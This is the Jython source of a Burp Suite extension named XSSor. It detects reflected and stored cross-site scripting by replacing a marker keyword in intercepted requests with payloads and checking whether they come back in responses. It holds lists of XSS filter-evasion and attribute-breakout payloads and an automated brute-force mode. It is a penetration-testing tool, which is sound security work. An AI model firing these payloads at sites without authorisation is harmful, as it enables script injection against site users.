from burp import IBurpExtender
from burp import ITab
from burp import IContextMenuFactory
from burp import IHttpListener
from burp import IMessageEditorController
from thread import start_new_thread
from java.net import URL
from java.awt import Color
from java.awt import Component
from java.io import PrintWriter
from java.util import ArrayList
from java.util import List;
from java.util import LinkedList
from java.awt.event import ItemListener
from java.awt.event import ItemListener
from java.awt.event import ActionListener
from java.awt.event import AdjustmentListener
from javax.swing import JList
from javax.swing import JTable
from javax.swing import JLabel
from javax.swing import JPanel
from javax.swing import JButton
from javax.swing import JTextArea
from javax.swing import JMenuItem
from javax.swing import JCheckBox
from javax.swing import JSplitPane
from javax.swing import JScrollPane
from javax.swing import JTabbedPane
from javax.swing import SwingUtilities
from javax.swing import DefaultListModel
from javax.swing.border import LineBorder
from javax.swing.event import ListSelectionListener
from javax.swing.table import AbstractTableModel
from threading import Lock
import re, urllib

class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController, AbstractTableModel, IContextMenuFactory):
    
    def	registerExtenderCallbacks(self, callbacks):
        # smart xss feature (print conclusion and observation)
        # mark resulsts
        # add automatic check pages in the same domain

        self.tagPayloads = ["<b>test","<b onmouseover=test()>test", "<img src=err onerror=test()>", "<script>test</script>""" , "<scr ipt>test</scr ipt>" , "<SCRIPT>test;</SCRIPT>" , "<scri<script>pt>test;</scr</script>ipt>" , "<SCRI<script>PT>test;</SCR</script>IPT>" , "<scri<scr<script>ipt>pt>test;</scr</sc</script>ript>ipt>" , "<IMG \"\"\"><SCRIPT>test</SCRIPT>\">" , "<IMG '''><SCRIPT>test</SCRIPT>'>" , "<SCR%00IPT>test</SCR%00IPT>" , "<IFRAME SRC='f' onerror=\"test\"></IFRAME>" , "<IFRAME SRC='f' onerror='test'></IFRAME>" , "<<SCRIPT>test//<</SCRIPT>" , "<img src=\"1\" onerror=\"test\">" , "<img src='1' onerror='test'" , "<STYLE TYPE=\"text/javascript\">test;</STYLE>" , "<<SCRIPT>test//<</SCRIPT>"]
        self.attributePayloads = ["\"\"\"><SCRIPT>test" , "'''><SCRIPT>test'" , "\"><script>test</script>" , "\"><script>test</script><\"" , "'><script>test</script>" , "'><script>test</script><'" , "\";test;\"" , "';test;'" , ";test;" , "\";test;//" , "\"onmouseover=test " , "onerror=\"test\"" , "onerror='test'" , "onload=\"test\"" , "onload='test'"]
        self.xssKey = 'xssme'
        # keep a reference to our callbacks object
        self._callbacks = callbacks
        
        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()
        
        # set our extension name
        callbacks.setExtensionName("XSSor")
        
        self.affectedResponses = ArrayList()
        self._log = ArrayList()
        self._lock = Lock()
        
        # main split pane
        self._splitpane = JSplitPane(JSplitPane.HORIZONTAL_SPLIT)
        
        # table of log entries
        logTable = Table(self)
        scrollPane = JScrollPane(logTable)
        self._splitpane.setLeftComponent(scrollPane)

        # tabs with request/response viewers
        tabs = JTabbedPane()
        self._requestViewer = callbacks.createMessageEditor(self, False)
        self._responseViewer = callbacks.createMessageEditor(self, False)
        tabs.addTab("Request", self._requestViewer.getComponent())
        tabs.addTab("Response", self._responseViewer.getComponent())
        
        clearAPListBtn = JButton("Clear List",actionPerformed=self.clearAPList)
        clearAPListBtn.setBounds(10, 85, 120, 30)
        apListLabel = JLabel('Affected Pages List:')
        apListLabel.setBounds(10, 10, 140, 30)
        self.affectedModel = DefaultListModel()
        self.affectedList = JList(self.affectedModel)
        self.affectedList.addListSelectionListener(listSelectedChange(self))
        scrollAList = JScrollPane(self.affectedList)
        scrollAList.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        scrollAList.setBounds(150, 10, 550, 200)
        scrollAList.setBorder(LineBorder(Color.BLACK))


        APtabs = JTabbedPane()
        self._requestAPViewer = callbacks.createMessageEditor(self, False)
        self._responseAPViewer = callbacks.createMessageEditor(self, False)
        APtabs.addTab("Request", self._requestAPViewer.getComponent())
        APtabs.addTab("Affeced Page Response", self._responseAPViewer.getComponent())
        APtabs.setBounds(0, 250, 700, 350)
        APtabs.setSelectedIndex(1)

        self.APpnl = JPanel()
        self.APpnl.setBounds(0, 0, 1000, 1000);
        self.APpnl.setLayout(None)
        self.APpnl.add(scrollAList)
        self.APpnl.add(clearAPListBtn)
        self.APpnl.add(APtabs)
        self.APpnl.add(apListLabel)
        tabs.addTab("Affected Pages", self.APpnl)
        self.intercept = 0    

        ## init conf panel
        startLabel = JLabel("Plugin status:")
        startLabel.setBounds(10, 10, 140, 30)
        
        payloadLabel = JLabel("Basic Payload:")
        payloadLabel.setBounds(10, 50, 140, 30)

        self.basicPayload = "<script>alert(1)</script>"
        self.basicPayloadTxt = JTextArea(self.basicPayload, 5, 30)
        self.basicPayloadTxt.setBounds(120, 50, 305, 30)

        self.bruteForceMode = JCheckBox("Brute Force Mode")
        self.bruteForceMode.setBounds(120, 80, 300, 30)
        self.bruteForceMode.addItemListener(handleBFModeChange(self))

        self.tagPayloadsCheck = JCheckBox("Tag paylods")
        self.tagPayloadsCheck.setBounds(120, 100, 300, 30)
        self.tagPayloadsCheck.setSelected(True)
        self.tagPayloadsCheck.setEnabled(False)
        self.tagPayloadsCheck.addItemListener(handleBFModeList(self))


        self.attributePayloadsCheck = JCheckBox("Attribute payloads")
        self.attributePayloadsCheck.setBounds(260, 100, 300, 30)
        self.attributePayloadsCheck.setSelected(True)
        self.attributePayloadsCheck.setEnabled(False)
        self.attributePayloadsCheck.addItemListener(handleBFModeList(self))
        
        payloadListLabel = JLabel("Payloads list (for BF mode):")
        payloadListLabel.setBounds(10, 130, 140, 30)

        self.payloadsModel = DefaultListModel()
        self.payloadsList = JList(self.payloadsModel)
        scrollPayloadsList = JScrollPane(self.payloadsList)
        scrollPayloadsList.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        scrollPayloadsList.setBounds(120, 170, 300, 200)
        scrollPayloadsList.setBorder(LineBorder(Color.BLACK)) # add buttons to remove payloads and add

        for payload in self.tagPayloads:
            self.payloadsModel.addElement(payload)

        for payload in self.attributePayloads:
            self.payloadsModel.addElement(payload)

        self.startButton = JButton("XSSor is off",actionPerformed=self.startOrStop)
        self.startButton.setBounds(120, 10, 120, 30)
        self.startButton.setBackground(Color(255, 100, 91, 255))

        consoleTab = JTabbedPane()
        self.consoleLog = JTextArea("", 5, 30)
        scrollLog = JScrollPane(self.consoleLog) 
        scrollLog.setVerticalScrollBarPolicy(JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED)
        scrollLog.setBounds(120, 170, 550, 200)
        scrollLog.setBorder(LineBorder(Color.BLACK))
        scrollLog.getVerticalScrollBar().addAdjustmentListener(autoScrollListener(self))
        consoleTab.addTab("Console" , scrollLog)
        consoleTab.setBounds(0, 400, 500, 200)

        self.pnl = JPanel()
        self.pnl.setBounds(0, 0, 1000, 1000);
        self.pnl.setLayout(None);
        self.pnl.add(self.startButton)
        self.pnl.add(startLabel)
        self.pnl.add(payloadLabel)
        self.pnl.add(self.basicPayloadTxt)
        self.pnl.add(self.bruteForceMode)
        self.pnl.add(payloadListLabel)
        self.pnl.add(scrollPayloadsList)
        self.pnl.add(self.attributePayloadsCheck)
        self.pnl.add(self.tagPayloadsCheck)
        self.pnl.add(consoleTab)

        

        tabs.addTab("Configuration", self.pnl)
        tabs.setSelectedIndex(3)
        self._splitpane.setRightComponent(tabs)
        
        # customize our UI components
        callbacks.customizeUiComponent(self._splitpane)
        callbacks.customizeUiComponent(logTable)
        callbacks.customizeUiComponent(scrollPane)
        callbacks.customizeUiComponent(tabs)
        
        # add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)
        
        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)    
        self._callbacks.registerContextMenuFactory(self)

        print "Thank you for installing XSSor v0.1 extension"
        print "Created by Barak Tawily"
        print "\nGithub:\nhttps://github.com/Quitten/XSSor"
        return
        
    #
    # implement ITab
    #
    
    def getTabCaption(self):
        return "XSSor"
    
    def getUiComponent(self):
        return self._splitpane
        
    #
    # implement IHttpListener
    #
    
    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if self.intercept == 1:
            if toolFlag == 4:
                # only process requests
                if not messageIsRequest:
                    self.checkForKey(messageInfo)

        return



    def printLog(self, message):
        self.consoleLog.setText(self.consoleLog.getText() + '\r\n' + message)


    def checkXSS(self,messageInfo, urlStr, requestBody, currentPayload):
        self.printLog('trying exploit with the payload: ' + currentPayload)
        requestURL = URL(urlStr.replace(self.xssKey, currentPayload))
        requestBody = requestBody.replace(self.xssKey, urllib.pathname2url(currentPayload))
        httpService = self._helpers.buildHttpService(str(requestURL.getHost()), int(requestURL.getPort()), requestURL.getProtocol() == "https")
        response = self._callbacks.makeHttpRequest(httpService, requestBody)
        responseInfo = self._helpers.analyzeResponse(response.getResponse())
        analyzedResponse = self._helpers.bytesToString(response.getResponse()) # change body offeset + make ui for affeccted pages
        responseBody = analyzedResponse.encode('utf-8')
        vulnOrNot = 'no'

        if currentPayload in responseBody:
            self.printLog('payload: ' + currentPayload + ' found to be vulnarble') 
            vulnOrNot = 'yes'
            # mark the payload
        if not len(self.affectedResponses) == 0:
            for request in self.affectedResponses: # bug in case of no response in messageinfo
                self.printLog('checking affeccted page' +  str(request.getUrl()))
                requestURL = request.getUrl()
                httpService = self._helpers.buildHttpService(str(requestURL.getHost()), int(requestURL.getPort()), requestURL.getProtocol() == "https")
                affectedPageResponse = self._callbacks.makeHttpRequest(httpService, request.getRequest())
                analyzedResponse = self._helpers.bytesToString(affectedPageResponse.getResponse())
                responseBody = analyzedResponse.encode('utf-8')

            if currentPayload in responseBody:
                vulnOrNot = 'yes, affected page'
                self.printLog('affeccted page has been found as vulnerable')
        
        self._lock.acquire()
        row = self._log.size()
        self._log.add(LogEntry(self._helpers.analyzeRequest(response).getUrl(), self._callbacks.saveBuffersToTempFiles(response), currentPayload, vulnOrNot))
        self.fireTableRowsInserted(row, row)
        self._lock.release()



    def checkForKey(self, messageInfo):
        
        currentPayload = self.tagPayloads[0]
        requestInfo = self._helpers.analyzeRequest(messageInfo)
        requestHeaders = list(requestInfo.getHeaders())
        
        requestURL = requestInfo.getUrl()
        urlStr = str(requestURL)
        self.printLog('checking for xss key in URL: '+urlStr)
        requestBody = self._helpers.bytesToString(messageInfo.getRequest())
        requestBody =  re.sub('Referer:.*\n', '', requestBody, flags=re.MULTILINE, count=1) # workaround avoid xsskey in the referer newHeaders
        if self.xssKey in urlStr  or self.xssKey in requestBody:
            self.printLog( 'xss key has been found')
            if self.bruteForceMode.isSelected():
                for i in range(0,self.payloadsModel.getSize()):
                    payload = self.payloadsModel.getElementAt(i)
                    self.checkXSS(messageInfo, urlStr, requestBody, payload)
            else:
                self.checkXSS(messageInfo, urlStr, requestBody, self.basicPayloadTxt.getText())


                #
    # extend AbstractTableModel
    #
    
    def getRowCount(self):
        try:
            return self._log.size()
        except:
            return 0

    def getColumnCount(self):
        return 3

    def getColumnName(self, columnIndex):
        if columnIndex == 0:
            return "URL"
        if columnIndex == 1:
            return "Payload"
        if columnIndex == 2:
            return "Vulnerable?"
            
        return ""

    def getValueAt(self, rowIndex, columnIndex):
        logEntry = self._log.get(rowIndex)
        if columnIndex == 0:
            # return self._callbacks.getToolName(logEntry._tool)
            return logEntry._url.toString()

        if columnIndex == 1:
            return logEntry._payload

        if columnIndex == 2:
            return logEntry._vulnOrNot

        return ""

    #
    # implement IMessageEditorController
    # this allows our request/response viewers to obtain details about the messages being displayed
    #
    
    def getHttpService(self):
        return self._currentlyDisplayedItem.getHttpService()

    def getRequest(self):
        return self._currentlyDisplayedItem.getRequest()

    def getResponse(self):
        return self._currentlyDisplayedItem.getResponse()

    def startOrStop(self, event):
        if self.startButton.getText() == "XSSor is off":
            self.startButton.setText("XSSor is on")
            self.startButton.setBackground(Color.GREEN)
            self.printLog('on, waiting for key word to be found (' + self.xssKey + ')')
            self.intercept = 1
        else:
            self.startButton.setText("XSSor is off")
            self.startButton.setBackground(Color(255, 100, 91, 255))
            self.intercept = 0

    def clearAPList(self, event):
        self.affectedModel.clear()
        self.affectedResponses = ArrayList()

    #
    # implement IContextMenuFactory
    #
    def createMenuItems(self, invocation):
        responses = invocation.getSelectedMessages();
        if responses > 0:
            ret = LinkedList()
            affectedMenuItem = JMenuItem("XSSor: Add affected page");
            affectedMenuItem.addActionListener(handleMenuItems(self,responses[0], "affected"))   
            ret.add(affectedMenuItem)
            return(ret);
        return null;

    def addAfectedPage(self,messageInfo):
        self.affectedModel.addElement(str(self._helpers.analyzeRequest(messageInfo).getUrl()))
        self.affectedResponses.add(messageInfo)
#
# extend JTable to handle cell selection
#
    
class Table(JTable):

    def __init__(self, extender):
        self._extender = extender
        self.setModel(extender)
        return
    
    def changeSelection(self, row, col, toggle, extend):
    
        # show the log entry for the selected row
        logEntry = self._extender._log.get(row)
        self._extender._requestViewer.setMessage(logEntry._requestResponse.getRequest(), True)
        self._extender._responseViewer.setMessage(logEntry._requestResponse.getResponse(), False)
        self._extender._requestAPViewer.setMessage(logEntry._requestResponse.getRequest(), True)        
        self._extender._currentlyDisplayedItem = logEntry._requestResponse
        # self._extender.
        
        JTable.changeSelection(self, row, col, toggle, extend)
        return
    
#
# class to hold details of each log entry
#

class LogEntry:

    def __init__(self, url, requestResponse, payload, vulnOrNot):
        self._payload = payload
        self._requestResponse = requestResponse
        self._url = url
        self._vulnOrNot = vulnOrNot
        return
      


class handleMenuItems(ActionListener):
    def __init__(self, extender, messageInfo, menuName):
        self._extender = extender
        self._menuName = menuName
        self._messageInfo = messageInfo

    def actionPerformed(self, e):
        if self._menuName == "affected":
            start_new_thread(self._extender.addAfectedPage,(self._messageInfo,))



# # class mouseclick(MouseAdapter):

# #     def __init__(self, extender):
# #         self._extender = extender

# #     def mouseReleased(self, evt):
# #         if evt.button == 3:
#             self._extender.menu.show(evt.getComponent(), evt.getX(), evt.getY())


class listSelectedChange(ListSelectionListener):
    def __init__(self, extender):
        self._extender = extender

    def valueChanged(self, e):
        self._extender._responseAPViewer.setMessage(self._extender.affectedResponses.get(self._extender.affectedList.getSelectedIndex()).getResponse(), False)


class handleBFModeChange(ItemListener):
    def __init__(self, extender):
        self._extender = extender

    def itemStateChanged(self, e):
        if self._extender.bruteForceMode.isSelected():
            self._extender.tagPayloadsCheck.setEnabled(True)
            self._extender.attributePayloadsCheck.setEnabled(True)
        else:
            self._extender.tagPayloadsCheck.setEnabled(False)
            self._extender.attributePayloadsCheck.setEnabled(False)


class handleBFModeList(ItemListener):
    def __init__(self, extender):
        self._extender = extender

    def itemStateChanged(self, e):
        self._extender.payloadsModel.clear()
        if self._extender.tagPayloadsCheck.isSelected():
            for payload in self._extender.tagPayloads:
                self._extender.payloadsModel.addElement(payload)
            
        if self._extender.attributePayloadsCheck.isSelected():
            for payload in self._extender.attributePayloads:
                self._extender.payloadsModel.addElement(payload)


class autoScrollListener(AdjustmentListener):
    def __init__(self, extender):
        self._extender = extender

    def adjustmentValueChanged(self, e):
        e.getAdjustable().setValue(e.getAdjustable().getMaximum())
